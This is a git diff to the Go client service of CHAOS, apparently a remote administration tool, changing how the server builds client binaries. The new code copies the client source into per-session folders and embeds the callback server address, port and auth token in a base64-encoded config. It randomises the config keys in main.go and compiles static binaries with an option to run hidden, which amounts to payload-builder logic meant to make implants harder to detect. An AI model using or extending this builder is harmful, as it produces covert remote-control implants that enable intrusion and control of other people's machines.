@@ -1,6 +1,7 @@
 package client
 
 import (
+	"bytes"
 	"context"
 	"encoding/json"
 	"fmt"
@@ -12,16 +13,26 @@ import (
 	"github.com/tiagorlampert/CHAOS/internal/utils"
 	"github.com/tiagorlampert/CHAOS/internal/utils/image"
 	"github.com/tiagorlampert/CHAOS/internal/utils/jwt"
+	"github.com/tiagorlampert/CHAOS/internal/utils/random"
 	"github.com/tiagorlampert/CHAOS/internal/utils/system"
 	"github.com/tiagorlampert/CHAOS/presentation/http/request"
 	authRepo "github.com/tiagorlampert/CHAOS/repositories/auth"
 	"github.com/tiagorlampert/CHAOS/services/auth"
 	"net"
 	"net/url"
+	"os"
 	"os/exec"
 	"regexp"
 	"strings"
 	"sync"
+)
+
+const (
+	clientBaseDir  = "client/"
+	buildBaseDir   = "build/"
+	configFileName = "config.json"
+	mainFileName   = "main.go"
+	buildStr       = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags '%s -s -w -X main.Version=%s -extldflags "-static"' -o ../../temp/%s main.go`
 )
 
 type clientService struct {
@@ -135,36 +146,62 @@ func handleResponse(payload *entities.Command) (*entities.Command, error) {
 }
 
 func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error) {
-	if !isValidIPAddress(input.ServerAddress) && !isValidURL(input.ServerAddress) {
+	if !isValidIPAddress(input.GetServerAddress()) && !isValidURL(input.GetServerAddress()) {
 		return "", internal.ErrInvalidServerAddress
 	}
 	if !isValidPort(input.ServerPort) {
 		return "", internal.ErrInvalidServerPort
 	}
 
-	filename, err := utils.NormalizeString(input.Filename)
+	buildPath, err := c.PrepareBuildSession(input)
 	if err != nil {
 		return "", err
 	}
+	defer utils.RemoveDir(buildPath)
 
-	newToken, err := c.GenerateNewToken()
-	if err != nil {
-		return "", err
-	}
-
-	const buildStr = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags '%s -s -w -X main.Version=%s -X main.Port=%s -X main.ServerAddress=%s -X main.Token=%s -extldflags "-static"' -o ../temp/%s main.go`
-
-	filename = buildFilename(input.OSTarget, filename)
-	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.AppVersion, input.ServerPort, input.ServerAddress, newToken, filename)
+	filename := buildFilename(input.OSTarget, input.GetFilename())
+	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.AppVersion, filename)
 
 	cmd := exec.Command("sh", "-c", buildCmd)
-	cmd.Dir = "client/"
+	cmd.Dir = buildPath
 
 	outputErr, err := cmd.CombinedOutput()
 	if err != nil {
 		return "", fmt.Errorf("%w:%s", err, outputErr)
 	}
 	return filename, nil
+}
+
+type ClientParam struct {
+	Key   string
+	Value string
+}
+
+func (c clientService) BuildClientConfiguration(input BuildClientBinaryInput) (map[string]ClientParam, error) {
+
+	newToken, err := c.GenerateNewToken()
+	if err != nil {
+		return nil, err
+	}
+
+	const jsonStringLength = 10
+
+	configurationMap := make(map[string]ClientParam)
+
+	configurationMap["port"] = ClientParam{
+		Key:   random.GenerateString(jsonStringLength),
+		Value: input.GetServerPort(),
+	}
+	configurationMap["server_address"] = ClientParam{
+		Key:   random.GenerateString(jsonStringLength),
+		Value: input.GetServerAddress(),
+	}
+	configurationMap["token"] = ClientParam{
+		Key:   random.GenerateString(jsonStringLength),
+		Value: newToken,
+	}
+
+	return configurationMap, err
 }
 
 func isValidIPAddress(s string) bool {
@@ -189,6 +226,70 @@ func (c clientService) GenerateNewToken() (string, error) {
 		return "", err
 	}
 	return jwt.NewToken(config.SecretKey, jwt.IdentityDefaultUser)
+}
+
+func (c clientService) WriteClientConfigurationFile(configuration map[string]ClientParam, buildPath string, sessionFilename string) error {
+	m := make(map[string]string)
+
+	for _, config := range configuration {
+		m[config.Key] = config.Value
+	}
+
+	configurationJson, err := json.Marshal(m)
+	if err != nil {
+		return err
+	}
+
+	encoded := utils.EncodeBase64(string(configurationJson))
+
+	return utils.WriteFile(buildPath+sessionFilename, bytes.NewBufferString(encoded).Bytes())
+}
+
+func (c clientService) ReplaceClientConfigurationFile(configuration map[string]ClientParam, buildPath string, sessionFilename string) error {
+	mainFilepath := buildPath + mainFileName
+	file, err := os.ReadFile(mainFilepath)
+	if err != nil {
+		return err
+	}
+
+	s := string(file)
+	for key, param := range configuration {
+		oldParam := fmt.Sprintf(`"%s"`, key)
+		newParam := fmt.Sprintf(`"%s"`, param.Key)
+		s = strings.ReplaceAll(s, oldParam, newParam)
+	}
+
+	s = strings.ReplaceAll(s, configFileName, sessionFilename)
+
+	return utils.WriteFile(mainFilepath, bytes.NewBufferString(s).Bytes())
+}
+
+func (c clientService) PrepareBuildSession(input BuildClientBinaryInput) (string, error) {
+	sessionID := uuid.New().String()
+	sessionFilename := fmt.Sprintf("%s", sessionID)
+	buildPath := fmt.Sprint(buildBaseDir, sessionID, "/")
+
+	err := utils.CopyDir(clientBaseDir, buildPath)
+	if err != nil {
+		return "", err
+	}
+
+	clientConfiguration, err := c.BuildClientConfiguration(input)
+	if err != nil {
+		return "", err
+	}
+
+	err = c.WriteClientConfigurationFile(clientConfiguration, buildPath, sessionFilename)
+	if err != nil {
+		return "", err
+	}
+
+	err = c.ReplaceClientConfigurationFile(clientConfiguration, buildPath, sessionFilename)
+	if err != nil {
+		return "", err
+	}
+
+	return buildPath, nil
 }
 
 func handleOSType(osType system.OSType) string {
